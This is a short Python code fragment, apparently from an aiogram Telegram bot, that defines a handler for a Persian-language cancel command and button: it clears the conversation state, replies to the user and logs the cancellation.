# =============================================
# ❌ دستور لغو عملیات
# =============================================
@dp.message(Command("cancel"))
@dp.message(lambda message: message.text == "❌ لغو")
async def cancel_command(message: Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state is None:
        await message.reply("⚠️ هیچ عملیات فعالی وجود ندارد.")
        return
    
    await state.clear()
    await message.reply(
        "✅ عملیات لغو شد.\n"
        "برای شروع مجدد از دستور /start استفاده کنید.",
        reply_markup=remove_keyboard()
    )
    logger.info(f"✅ عملیات توسط کاربر {message.chat.id} لغو شد.")

